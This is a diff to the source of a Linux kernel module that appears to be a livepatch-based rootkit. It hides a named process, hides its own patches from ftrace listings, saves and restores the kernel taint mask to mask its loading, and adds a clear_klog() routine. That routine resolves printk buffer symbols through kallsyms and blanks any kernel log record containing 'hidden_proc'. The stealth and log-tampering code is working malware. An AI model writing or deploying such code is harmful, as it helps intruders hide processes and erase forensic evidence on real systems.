@@ -15,7 +15,6 @@
 #include <linux/fs.h>
 #include <linux/file.h>
 #include <linux/proc_fs.h>
-#include <linux/proc_fs.h>
 #include <linux/proc_ns.h>
 #include <linux/refcount.h>
 #include <linux/spinlock.h>
@@ -28,6 +27,7 @@
 #include <linux/connector.h>
 #include <linux/dynamic_debug.h>
 #include <linux/audit.h>
+#include <linux/string.h>
 
 
 #define FIRST_PROCESS_ENTRY 256
@@ -40,7 +40,7 @@ struct tgid_iter {
         struct task_struct *task;
 };
 
-static struct klp_ops {
+struct klp_ops {
         struct list_head node;
         struct list_head func_stack;
         struct ftrace_ops fops;
@@ -66,6 +66,19 @@ struct ftrace_page {
         int                     size;
 };
 
+struct printk_log {
+        u64 ts_nsec;            /* timestamp in nanoseconds */
+        u16 len;                /* length of entire record */
+        u16 text_len;           /* length of text buffer */
+        u16 dict_len;           /* length of dictionary buffer */
+        u8 facility;            /* syslog facility */
+        u8 flags:5;             /* internal record flags */
+        u8 level:3;             /* syslog level */
+#ifdef CONFIG_PRINTK_CALLER
+        u32 caller_id;            /* thread id or processor id */
+#endif
+};
+
 struct module *this_module = THIS_MODULE;
 static int hidden_base_exe = 0;
 module_param(hidden_base_exe, int, 0644);
@@ -73,6 +86,17 @@ module_param(hidden_base_exe, int, 0644);
 static char hidden_proc_name[] = "hidden_comm";
 module_param_string(hidden_proc_name, hidden_proc_name, PATH_MAX, 0644);
 static char exe_buf[PATH_MAX] = {0};
+
+
+static char hidden_msg_klog[] = "hidden_proc";
+static char **p_log_buf = NULL;
+static raw_spinlock_t *p_logbuf_lock = NULL;
+static u64 *p_clear_seq = NULL;
+static u32 *p_clear_idx = NULL;
+static u64 *p_log_next_seq = NULL;
+static u32 *p_log_next_idx = NULL;
+static void (*p__printk_safe_enter)(void) = NULL;
+static void (*p__printk_safe_exit)(void) = NULL;
 
 static struct tgid_iter (*p_next_tgid)(struct pid_namespace *ns, struct tgid_iter iter) = NULL;
 static bool (*p_ptrace_may_access)(struct task_struct *task, unsigned int mode) = NULL;
@@ -83,7 +107,7 @@ static bool (*p_proc_fill_cache)(struct file *file, struct dir_context *ctx,
 static struct dentry * (*p_proc_pid_instantiate)(struct dentry * dentry,
                                    struct task_struct *task, const void *ptr) = NULL;
 
-static void (*p___audit_bprm)(struct linux_binprm *bprm) = NULL;
+//static void (*p___audit_bprm)(struct linux_binprm *bprm) = NULL;
 
 static struct list_head *p_modules = NULL;
 static char * (*p_module_flags)(struct module *mod, char *buf) = NULL;
@@ -98,9 +122,9 @@ static const struct kernel_symbol *p__stop___ksymtab = NULL;
 static unsigned long old_tainted_mask = 0;
 static unsigned long *p_tainted_mask = NULL;
 
-static struct ftrace_ops __rcu **p_ftrace_ops_list = NULL;
-static struct ftrace_ops *p_ftrace_list_end = NULL;
-static struct mutex *p_ftrace_lock = NULL;
+//static struct ftrace_ops __rcu **p_ftrace_ops_list = NULL;
+//static struct ftrace_ops *p_ftrace_list_end = NULL;
+//static struct mutex *p_ftrace_lock = NULL;
 static struct klp_ops * (*p_klp_find_ops)(void *old_func) = NULL;
 static struct ftrace_func_entry *(*p_ftrace_lookup_ip)(struct ftrace_hash *hash, unsigned long ip) = NULL;
 static struct ftrace_page       **p_ftrace_pages_start = NULL;
@@ -437,6 +461,7 @@ static void restore_tainted_mask(void)
 	old_tainted_mask = 0;
 }
 
+#if 0
 static int remove_ftrace_ops(struct ftrace_ops *ops)
 {
         struct ftrace_ops **p;
@@ -463,6 +488,7 @@ static int remove_ftrace_ops(struct ftrace_ops *ops)
         *p = (*p)->next;
         return 0;
 }
+#endif
 
 #define do_for_each_ftrace_rec(pg, rec)                                 \
         for (pg = *p_ftrace_pages_start; pg; pg = pg->next) {              \
@@ -515,6 +541,114 @@ static void hidden_from_enabled_functions(struct klp_object *obj )
 		fops->flags &= ~FTRACE_OPS_FL_ENABLED;
 #endif
         }
+}
+
+static struct printk_log *log_from_idx(u32 idx)
+{
+        struct printk_log *msg = (struct printk_log *)(*p_log_buf + idx);
+
+        /*
+         * A length == 0 record is the end of buffer marker. Wrap around and
+         * read the message at the start of the buffer.
+         */
+        if (!msg->len) 
+                return (struct printk_log *)(*p_log_buf);
+        return msg; 
+}
+
+static u32 log_next(u32 idx)
+{
+        struct printk_log *msg = (struct printk_log *)(*p_log_buf + idx);
+
+        /* length == 0 indicates the end of the buffer; wrap */
+        /*
+         * A length == 0 record is the end of buffer marker. Wrap around and
+         * read the message at the start of the buffer as *this* one, and
+         * return the one after that.
+         */ 
+        if (!msg->len) {
+                msg = (struct printk_log *)(*p_log_buf);
+                return msg->len;
+        }
+        return idx + msg->len;
+}
+
+static char *log_text(const struct printk_log *msg) 
+{
+        return (char *)msg + sizeof(struct printk_log);
+}
+
+#define printk_safe_enter_irq()         \
+        do {                                    \
+                local_irq_disable();            \
+                p__printk_safe_enter();          \
+        } while (0)
+
+#define printk_safe_exit_irq()                  \
+        do {                                    \
+                p__printk_safe_exit();           \
+                local_irq_enable();             \
+        } while (0)
+
+#define logbuf_lock_irq()                               \
+        do {                                            \
+                printk_safe_enter_irq();                \
+                raw_spin_lock(p_logbuf_lock);            \
+        } while (0)
+
+#define logbuf_unlock_irq()                             \
+        do {                                            \
+                raw_spin_unlock(p_logbuf_lock);          \
+                printk_safe_exit_irq();                 \
+        } while (0)
+
+
+static void clear_klog(void)
+{
+	u64 seq;
+	u32 idx;
+
+	u64 sum_seq = 0;
+	u32 sum_idx = 0;
+	//int flag = 0;
+
+	logbuf_lock_irq();      
+	seq = *p_clear_seq;
+	idx = *p_clear_idx;
+	while (seq < *p_log_next_seq) {
+		struct printk_log *msg = log_from_idx(idx);
+		char *text = log_text(msg);
+
+		idx = log_next(idx);
+		seq++;
+
+		//if (flag == 0) {
+			if (msg->text_len >= sizeof(hidden_msg_klog)) {
+				if (strstr(text, hidden_msg_klog)) { 
+					//flag = 1;
+					//sum_seq++;
+					//sum_idx += msg->len;
+					msg->text_len = 0;
+					msg->dict_len = 0;
+					msg->len = 0;
+				}
+			}
+		#if 0
+		} else {
+			sum_seq++;
+			sum_idx += msg->len;
+		}
+		#endif
+	}
+
+#if 0
+	if (*p_log_next_seq > sum_seq)
+		*p_log_next_seq -= sum_seq;
+	if (*p_log_next_idx > sum_idx)
+		*p_log_next_idx -= sum_idx;
+#endif
+
+	logbuf_unlock_irq();      
 }
 
 static struct klp_func funcs[] = {
@@ -614,6 +748,7 @@ static int livepatch_init(void)
 	if (!p_tainted_mask)
 		return -1;
 
+#if 0
 	p_ftrace_lock = (struct mutex *) kallsyms_lookup_name("ftrace_lock");
 	if (!p_ftrace_lock)
 		return -1;
@@ -625,6 +760,7 @@ static int livepatch_init(void)
 	p_ftrace_list_end = (struct ftrace_ops *) kallsyms_lookup_name("ftrace_list_end");
 	if (!p_ftrace_list_end)
 		return -1;
+#endif
 
 	p_klp_find_ops = (struct klp_ops *(*)(void *old_func)) kallsyms_lookup_name("klp_find_ops");
 	if (!p_klp_find_ops)
@@ -640,6 +776,38 @@ static int livepatch_init(void)
 	if (!p_ftrace_pages_start)
 		return -1;
 
+	p_log_buf = (char **) kallsyms_lookup_name("log_buf");
+	if (!p_log_buf)
+		return -1;
+
+	p_logbuf_lock = (raw_spinlock_t *) kallsyms_lookup_name("logbuf_lock");
+	if (!p_logbuf_lock)
+		return -1;
+
+	p_clear_seq = (u64*) kallsyms_lookup_name("clear_seq");
+	if (!p_clear_seq)
+		return -1;
+
+	p_clear_idx = (u32*) kallsyms_lookup_name("clear_idx");
+	if (!p_clear_idx)
+		return -1;
+
+	p_log_next_seq = (u64*) kallsyms_lookup_name("log_next_seq");
+	if (!p_log_next_seq)
+		return -1;
+
+	p_log_next_idx = (u32*) kallsyms_lookup_name("log_next_idx");
+	if (!p_log_next_idx)
+		return -1;
+
+	p__printk_safe_enter = (void(*)(void)) kallsyms_lookup_name("__printk_safe_enter");
+	if (!p__printk_safe_enter)
+		return -1;
+
+	p__printk_safe_exit = (void(*)(void)) kallsyms_lookup_name("__printk_safe_exit");
+	if (!p__printk_safe_exit)
+		return -1;
+
 	save_tainted_mask();
 	ret = klp_enable_patch(&patch);
 	if (ret == 0) { 
@@ -648,6 +816,8 @@ static int livepatch_init(void)
 		hidden_from_enabled_functions(objs);
 	}
 	restore_tainted_mask();
+
+	clear_klog();
 
 	return ret;
 }
